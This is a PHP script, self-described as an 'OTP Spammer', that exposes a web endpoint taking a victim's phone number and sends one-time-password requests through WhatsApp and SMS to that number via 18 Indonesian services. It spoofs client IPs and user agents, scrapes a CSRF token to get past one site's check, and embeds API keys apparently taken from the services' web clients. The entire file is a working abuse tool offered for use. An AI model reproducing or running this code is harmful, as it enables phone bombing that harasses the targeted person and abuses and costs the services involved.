<?php
// Deskripsi: Nanzz API - OTP Spammer Full Edition
// Contoh: {"phone": "62812345678"}
// JANGAN HAPUS CONTOH DIATAS - ITU FORMAT PARAMETER YANG BENAR
// @param phone Nomor telepon target (08xx / 628xx)

header('Content-Type: application/json; charset=utf-8');
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$phone = isset($_GET['phone']) ? trim($_GET['phone']) : '';

if (empty($phone) || strlen($phone) < 10) {
    echo json_encode(['status' => false, 'creator' => 'Nanzz', 'result' => ['error' => 'Parameter "phone" wajib diisi (min 10 digit)']]);
    exit;
}

// Normalize phone
$phone = preg_replace('/[^0-9]/', '', $phone);
if (substr($phone, 0, 1) === '0') $phone = '62' . substr($phone, 1);
if (substr($phone, 0, 2) !== '62') $phone = '62' . $phone;

$p08 = '0' . substr($phone, 2);
$pNoCountry = substr($phone, 2);

$uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];

function rUA() { global $uas; return $uas[array_rand($uas)]; }
function rIP() { return rand(1,255).'.'.rand(1,255).'.'.rand(1,255).'.'.rand(1,255); }

function req($url, $data = null, $headers = [], $method = 'POST') {
    $ch = curl_init();
    $opts = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT => rUA(),
        CURLOPT_HTTPHEADER => array_merge(['Content-Type: application/json', 'Accept: application/json', 'X-Forwarded-For: ' . rIP()], $headers)
    ];
    if ($method === 'POST' && $data) {
        $opts[CURLOPT_POST] = true;
        $opts[CURLOPT_POSTFIELDS] = is_array($data) ? json_encode($data) : $data;
    }
    curl_setopt_array($ch, $opts);
    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return in_array($code, [200, 201, 202, 204]);
}

$results = [];

// 1. Internet Rakyat
$results[] = ['name' => 'Internet Rakyat', 'success' => req('https://internetrakyat.id/api/app/auth/send-otp-register', ['phone_number' => $p08], ['x-api-key: 280999!FTTH', 'Origin: https://internetrakyat.id', 'Referer: https://internetrakyat.id/auth/register'])];

// 2. BonusBelanja
$results[] = ['name' => 'BonusBelanja', 'success' => req('https://www.bonusbelanja.com/api/auth/registration/app', ['phone' => $phone, 'name' => 'User', 'agreeTnc' => true, 'agreeContact' => false])];

// 3. Alodokter
$results[] = ['name' => 'Alodokter', 'success' => req('https://www.alodokter.com/resend-otp', ['user' => ['phone' => $p08, 'uuid' => bin2hex(random_bytes(16))], 'request_via' => 'whatsapp'])];

// 4. Dokterin
$results[] = ['name' => 'Dokterin', 'success' => req('https://api.dokterin.id/user/v1/users/login', ['phone' => $phone, 'tnc_accept' => true, 'device_id' => bin2hex(random_bytes(16))], ['Origin: https://dokterin.id', 'Referer: https://dokterin.id/login'])];

// 5. RS Bunda
$results[] = ['name' => 'RS Bunda', 'success' => req('https://cms.bunda.co.id/api/v1/auth/send-otp', ['phone_number' => $phone, 'type' => 'auth'], ['Origin: https://www.bunda.co.id', 'Referer: https://www.bunda.co.id/id', 'X-Requested-With: XMLHttpRequest', 'X-Locale: id'])];

// 6. Fastwork
$results[] = ['name' => 'Fastwork', 'success' => req('https://api.fastwork.id/auth/v2/signup.sendVerificationCode', ['phone_number' => $p08])];

// 7. Paper.id
$results[] = ['name' => 'Paper.id', 'success' => req('https://register.paper.id/api/v1/auth/register/send-otp', ['phone' => $phone, 'method' => 'whatsapp', 'registered_by' => 'web'])];

// 8. BeautyHaul
$results[] = ['name' => 'BeautyHaul', 'success' => req('https://www.beautyhaul.com/ajax/account/send_otp', ['method' => 'WhatsApp', 'phone' => $phone])];

// 9. Rumah123
$results[] = ['name' => 'Rumah123', 'success' => req('https://www.rumah123.com/api/otp/request-otp', ['ipAddress' => rIP(), 'phoneNumber' => $phone, 'portalId' => 1, 'type' => 'WHATSAPP', 'url' => 'https://www.rumah123.com/user/login'], ['Base-Url-Core: https://www.rumah123.com'])];

// 10. Saturdays
$results[] = ['name' => 'Saturdays', 'success' => req('https://beta.api.saturdays.com/api/v1/user/otp/send', ['number' => $pNoCountry, 'country_code' => '+62', 'type' => ''], ['x-api-key: GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'country-code: ID', 'visitor-id: ' . bin2hex(random_bytes(16)), 'session-id: ' . bin2hex(random_bytes(16))])];

// 11. Gritero
$results[] = ['name' => 'Gritero', 'success' => req('https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id', ['nama_lengkap' => 'User', 'telepon' => $p08, 'email' => 'user@mail.com'], ['Xid: ' . rand(1000000, 9999999), 'source: ocistok'])];

// 12. Duniagames
$results[] = ['name' => 'Duniagames', 'success' => req('https://api.duniagames.co.id/api/other/api/v1/content/', null, ['Accept-Language: id', 'x-device: ' . bin2hex(random_bytes(16)), 'Ciam-Type: FR'], 'GET')];

// 13. Bunda v2
$results[] = ['name' => 'Bunda v2', 'success' => req('https://bunda.co.id/api/v1/auth/send-otp', ['phone_number' => $pNoCountry, 'country_code' => '62', 'type' => 'auth'], ['Origin: https://bunda.co.id', 'Referer: https://bunda.co.id/', 'X-Requested-With: XMLHttpRequest'])];

// 14. Pinhome (CSRF)
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.pinhome.id/daftar',
    CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => true,
    CURLOPT_TIMEOUT => 10, CURLOPT_USERAGENT => rUA(),
    CURLOPT_HTTPHEADER => ['Accept: text/html,application/xhtml+xml']
]);
$resp = curl_exec($ch);
$hs = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$h = substr($resp, 0, $hs);
curl_close($ch);

$csrf = 'v4.local.fallback'; $cookie = '';
preg_match_all('/Set-Cookie:\s*([^;]+)/i', $h, $m);
foreach ($m[1] as $c) {
    $cookie .= $c . '; ';
    if (strpos($c, '_X7kCsrf') !== false) { $p = explode('=', $c); $csrf = $p[1] ?? 'v4.local.fallback'; }
}

$results[] = ['name' => 'Pinhome', 'success' => req(
    'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
    ['accountType' => 'customers', 'applicationType' => 'Pinhome Web', 'countryCode' => '62', 'medium' => 'whatsapp', 'otpType' => 'register', 'phoneNumber' => $pNoCountry],
    ['Content-Type: text/plain;charset=UTF-8', 'x-csrf-token: ' . $csrf, 'Cookie: ' . $cookie, 'Origin: https://www.pinhome.id', 'Referer: https://www.pinhome.id/daftar']
)];

// 15. SiCepat
$results[] = ['name' => 'SiCepat', 'success' => req("https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/{$phone}?sms=false", null, ['x-recaptcha: acf49209:033951e692315ba'], 'GET')];

// 16. Blibli
$results[] = ['name' => 'Blibli', 'success' => req('https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate', ['action' => 'REGISTER_OTP', 'channel' => 'WHATS_APP', 'recipient' => $phone, 'recaptchaToken' => ''])];

// 17. Matahari
$results[] = ['name' => 'Matahari', 'success' => req('https://matahari-backend-prod.matahari.com/api/auth/re-activation', ['mobileCountryCode' => '', 'mobileNumber' => $p08, 'activationCode' => ''])];

// 18. Maulagi
$results[] = ['name' => 'Maulagi', 'success' => req('https://api.maulagi.id/api/v2/auth/check', ['credentials' => $p08], ['X-ML-KEY: D09ACCPN9'])];

$success = count(array_filter($results, fn($r) => $r['success']));
$failed = count($results) - $success;

echo json_encode([
    'status' => true,
    'creator' => 'Nanzz',
    'input' => ['phone' => $phone],
    'result' => [
        'phone' => $phone,
        'total' => count($results),
        'success' => $success,
        'failed' => $failed,
        'results' => $results
    ]
], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
?>
